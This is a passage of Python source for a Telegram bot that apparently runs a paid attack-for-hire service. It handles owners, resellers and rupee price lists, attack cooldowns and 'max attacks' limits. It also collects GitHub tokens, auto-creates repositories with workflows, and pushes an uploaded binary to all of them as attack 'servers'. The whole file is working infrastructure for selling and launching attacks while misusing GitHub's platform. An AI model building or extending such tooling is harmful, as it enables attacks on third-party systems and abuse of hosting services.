        await update.message.reply_text(f"❌ ERROR: {str(e)}")

async def ownerslist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED - OWNERS ONLY")
        return
    
    if not owners:
        await update.message.reply_text("📭 NO OWNERS\n\nNo owners found.")
        return
    
    owners_msg = "👑 OWNERS LIST:\n\n"
    for owner_id, data in owners.items():
        owners_msg += f"├─ 👤 {data.get('username', 'Unknown')}\n"
        owners_msg += f"│  🆔 ID: {owner_id}\n"
        owners_msg += f"│  📅 Added: {data.get('added_date', 'N/A')}\n"
        owners_msg += f"│  👥 By: {data.get('added_by', 'System')}\n"
        if data.get('is_primary'):
            owners_msg += f"│  ⭐ Primary Owner\n"
        owners_msg += f"└─────────\n\n"
    
    owners_msg += f"📊 Total Owners: {len(owners)}"
    
    await update.message.reply_text(owners_msg)

async def resellerslist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED - OWNERS ONLY")
        return
    
    if not resellers:
        await update.message.reply_text("📭 NO RESELLERS\n\nNo resellers added yet.")
        return
    
    resellers_msg = "💼 RESELLERS LIST:\n\n"
    for reseller_id, data in resellers.items():
        resellers_msg += f"├─ 👤 {data.get('username', 'Unknown')}\n"
        resellers_msg += f"│  🆔 ID: {reseller_id}\n"
        resellers_msg += f"│  📅 Added: {data.get('added_date', 'N/A')}\n"
        resellers_msg += f"│  👥 By: {data.get('added_by', 'Unknown')}\n"
        resellers_msg += f"└─────────\n\n"
    
    resellers_msg += f"📊 Total Resellers: {len(resellers)}\n\n"
    
    # Add reseller price list
    resellers_msg += "💰 RESELLER PRICES:\n"
    for days, price in RESELLER_PRICES.items():
        resellers_msg += f"  {days} day{'s' if int(days) > 1 else ''}: ₹{price}\n"
    
    await update.message.reply_text(resellers_msg)

async def pricelist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # Available to owners, admins, and resellers
    if not (is_owner(user_id) or is_admin(user_id) or is_reseller(user_id)):
        await update.message.reply_text("⚠️ ACCESS DENIED")
        return
    
    price_msg = "💰 PRICE LIST\n\n"
    
    # User prices - visible to all authorized users
    price_msg += "👤 USER PRICES:\n"
    for days, price in USER_PRICES.items():
        price_msg += f"├ {days} day{'s' if int(days) > 1 else ''}: ₹{price}\n"
    price_msg += "\n"
    
    # Reseller prices - only for owners and admins
    if is_owner(user_id) or is_admin(user_id):
        price_msg += "💼 RESELLER PRICES:\n"
        for days, price in RESELLER_PRICES.items():
            price_msg += f"├ {days} day{'s' if int(days) > 1 else ''}: ₹{price}\n"
        price_msg += "\n"
        price_msg += "📊 Profit margin varies per plan"
    else:
        # Resellers see their prices
        price_msg += "💼 YOUR RESELLER PRICES:\n"
        for days, price in RESELLER_PRICES.items():
            price_msg += f"├ {days} day{'s' if int(days) > 1 else ''}: ₹{price}\n"
        price_msg += "\n"
        price_msg += "💡 Sell to users at standard rates"
    
    await update.message.reply_text(price_msg)

async def addtoken_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED - OWNERS ONLY")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("❌ INVALID SYNTAX\nUsage: /addtoken <github_token>\n\nExample:\n/addtoken ghp_xxxxxxxxxxxx\n\nToken will auto-detect username and create repo 'soulcrack-tg'")
        return
    
    token = context.args[0]
    repo_name = "soulcrack-tg"
    
    try:
        # Check if token already exists
        for existing_token in github_tokens:
            if existing_token['token'] == token:
                await update.message.reply_text("❌ Token already exists.")
                return
        
        # Verify token and get username
        g = Github(token)
        user = g.get_user()
        username = user.login
        
        # Create or get repository
        repo, created = create_repository(token, repo_name)
        
        # Add token to list
        new_token_data = {
            'token': token,
            'username': username,
            'repo': f"{username}/{repo_name}",
            'added_date': time.strftime("%Y-%m-%d %H:%M:%S"),
            'status': 'active'
        }
        
        github_tokens.append(new_token_data)
        save_github_tokens(github_tokens)
        
        if created:
            message = f"""✅ NEW REPO CREATED & TOKEN ADDED!

👤 Username: {username}
📁 Repo: {repo_name}
🔗 Full Path: {username}/{repo_name}
📊 Total servers: {len(github_tokens)}

Repo created with workflow file automatically!"""
        else:
            message = f"""✅ TOKEN ADDED TO EXISTING REPO!

👤 Username: {username}
📁 Repo: {repo_name}
🔗 Full Path: {username}/{repo_name}
📊 Total servers: {len(github_tokens)}"""
        
        await update.message.reply_text(message)
    except Exception as e:
        await update.message.reply_text(f"❌ ERROR\n\n{str(e)}\n\nMake sure your token has repo access permissions!")

async def removetoken_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("❌ INVALID SYNTAX\nUsage: /removetoken <number>\n\nUse /tokenslist to see token numbers")
        return
    
    try:
        token_num = int(context.args[0])
        if token_num < 1 or token_num > len(github_tokens):
            await update.message.reply_text(f"❌ Invalid number. Use 1-{len(github_tokens)}\n\nUse /tokenslist to see available tokens")
            return
        
        removed_token = github_tokens.pop(token_num - 1)
        save_github_tokens(github_tokens)
        
        await update.message.reply_text(f"""✅ SERVER REMOVED!

👤 Server: {removed_token['username']}
📁 Repo: {removed_token['repo']}
📊 Remaining: {len(github_tokens)}""")
    except ValueError:
        await update.message.reply_text("❌ Invalid number")

async def tokenslist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED")
        return
    
    if not github_tokens:
        await update.message.reply_text("📭 NO TOKENS\n\nNo GitHub tokens added yet.\n\nUse: /addtoken <github_token>")
        return
    
    tokens_list = "🔑 SERVERS LIST:\n\n"
    for i, token_data in enumerate(github_tokens, 1):
        tokens_list += f"{i}. 👤 {token_data['username']}\n"
        tokens_list += f"   📁 {token_data['repo']}\n"
        tokens_list += f"   📅 Added: {token_data['added_date']}\n"
        tokens_list += f"   🔄 Status: {token_data['status']}\n\n"
    
    tokens_list += f"📊 Total servers: {len(github_tokens)}\n\n"
    tokens_list += "To remove: /removetoken <number>"
    
    await update.message.reply_text(tokens_list)

async def maintenance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global MAINTENANCE_MODE
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED")
        return
    
    MAINTENANCE_MODE = not MAINTENANCE_MODE
    save_maintenance_mode(MAINTENANCE_MODE)
    
    status = "ENABLED ✅" if MAINTENANCE_MODE else "DISABLED ❌"
    await update.message.reply_text(f"🔧 MAINTENANCE MODE {status}")

async def setcooldown_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global COOLDOWN_DURATION
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("❌ INVALID SYNTAX\nUsage: /setcooldown <seconds>")
        return
    
    try:
        cooldown = int(context.args[0])
        if cooldown < 0:
            await update.message.reply_text("❌ Cooldown must be non-negative")
            return
        
        COOLDOWN_DURATION = cooldown
        save_cooldown(cooldown)
        
        await update.message.reply_text(f"✅ COOLDOWN SET\nNew cooldown: {cooldown} seconds")
    except ValueError:
        await update.message.reply_text("❌ Invalid number")

async def setmaxattack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global MAX_ATTACKS
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("❌ INVALID SYNTAX\nUsage: /setmaxattack <number>")
        return
    
    try:
        max_attacks = int(context.args[0])
        if max_attacks < 1:
            await update.message.reply_text("❌ Must be at least 1")
            return
        
        MAX_ATTACKS = max_attacks
        save_max_attacks(max_attacks)
        
        await update.message.reply_text(f"✅ MAX ATTACKS SET\nNew limit: {max_attacks}")
    except ValueError:
        await update.message.reply_text("❌ Invalid number")

async def binary_upload_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED - OWNERS ONLY")
        return ConversationHandler.END
    
    if not github_tokens:
        await update.message.reply_text("❌ NO SERVERS\n\nAdd tokens first using:\n/addtoken <github_token>")
        return ConversationHandler.END
    
    await update.message.reply_text(f"""📤 BINARY UPLOAD MODE

📊 Available servers: {len(github_tokens)}
📁 Target file: {BINARY_FILE_NAME}

📎 Send me your binary file now...

Cancel anytime with /cancel""")
    return WAITING_FOR_BINARY

async def handle_binary_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED")
        return ConversationHandler.END
    
    if not update.message.document:
        await update.message.reply_text("❌ Please send a file\n\nUse /cancel to exit")
        return WAITING_FOR_BINARY
    
    progress_msg = await update.message.reply_text("📥 DOWNLOADING FILE...")
    
    try:
        file = await update.message.document.get_file()
        file_path = f"temp_binary_{user_id}.bin"
        await file.download_to_drive(file_path)
        
        with open(file_path, 'rb') as f:
            binary_content = f.read()
        
        file_size = len(binary_content)
        await progress_msg.edit_text(f"📊 Downloaded: {file_size} bytes\n\n📤 Uploading to {len(github_tokens)} servers...")
        
        success_count = 0
        fail_count = 0
        results = []
        
        def upload_to_repo(token_data):
            try:
                g = Github(token_data['token'])
                repo = g.get_repo(token_data['repo'])
                
                try:
                    existing_file = repo.get_contents(BINARY_FILE_NAME)
                    repo.update_file(BINARY_FILE_NAME, "Update binary", binary_content, existing_file.sha, branch="main")
                    results.append((token_data['username'], True, "Updated"))
                except:
                    repo.create_file(BINARY_FILE_NAME, "Upload binary", binary_content, branch="main")
                    results.append((token_data['username'], True, "Created"))
            except Exception as e:
                results.append((token_data['username'], False, str(e)))
        
        threads = []
        for token_data in github_tokens:
            thread = threading.Thread(target=upload_to_repo, args=(token_data,))
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
        
        for username, success, status in results:
            if success:
                success_count += 1
            else:
                fail_count += 1
        
        os.remove(file_path)
        
        message = f"""✅ BINARY UPLOAD COMPLETED!

📊 RESULTS:
✅ Success: {success_count}
❌ Failed: {fail_count}
📊 Total: {len(github_tokens)}

📁 FILE: {BINARY_FILE_NAME}
📦 SIZE: {file_size} bytes
🕐 Time: {time.strftime("%Y-%m-%d %H:%M:%S")}"""
        
        await progress_msg.edit_text(message)
    except Exception as e:
        await progress_msg.edit_text(f"❌ UPLOAD ERROR\n\n{str(e)}")
    
    return ConversationHandler.END

async def cancel_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ OPERATION CANCELLED")
    return ConversationHandler.END

def main():
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Conversation handler for binary upload
    conv_handler_binary = ConversationHandler(
        entry_points=[CommandHandler('binary_upload', binary_upload_command)],
        states={
            WAITING_FOR_BINARY: [
                MessageHandler(filters.Document.ALL, handle_binary_file),
                CommandHandler('cancel', cancel_handler)
            ],
        },
        fallbacks=[CommandHandler('cancel', cancel_handler)]
    )
    
    application.add_handler(conv_handler_binary)
    
    # Command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("id", id_command))
    application.add_handler(CommandHandler("myaccess", myaccess_command))
    application.add_handler(CommandHandler("add", add_command))
    application.add_handler(CommandHandler("remove", remove_command))
    application.add_handler(CommandHandler("userslist", userslist_command))
    application.add_handler(CommandHandler("addowner", addowner_command))
    application.add_handler(CommandHandler("deleteowner", deleteowner_command))
    application.add_handler(CommandHandler("ownerslist", ownerslist_command))
    application.add_handler(CommandHandler("addreseller", addreseller_command))
    application.add_handler(CommandHandler("removereseller", removereseller_command))
    application.add_handler(CommandHandler("resellerslist", resellerslist_command))
    application.add_handler(CommandHandler("pricelist", pricelist_command))
    application.add_handler(CommandHandler("addtoken", addtoken_command))
    application.add_handler(CommandHandler("removetoken", removetoken_command))
    application.add_handler(CommandHandler("tokenslist", tokenslist_command))
    application.add_handler(CommandHandler("maintenance", maintenance_command))
    application.add_handler(CommandHandler("setcooldown", setcooldown_command))
    application.add_handler(CommandHandler("setmaxattack", setmaxattack_command))
    
    # Text message handler
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_input))
    
    print("🤖 BOT RUNNING...")
    print(f"👑 Owners: {len(owners)}")
    print(f"📊 Approved Users: {len(approved_users)}")
    print(f"⏳ Pending Users: {len(pending_users)}")
    print(f"💼 Resellers: {len(resellers)}")
    print(f"🔑 Servers: {len(github_tokens)}")
    print(f"🔧 Maintenance: {'ON' if MAINTENANCE_MODE else 'OFF'}")
    print(f"⏳ Cooldown: {COOLDOWN_DURATION}s")
    print(f"🎯 Max Attacks: {MAX_ATTACKS}")
    
    application.run_polling()

if __name__ == '__main__':
    main()
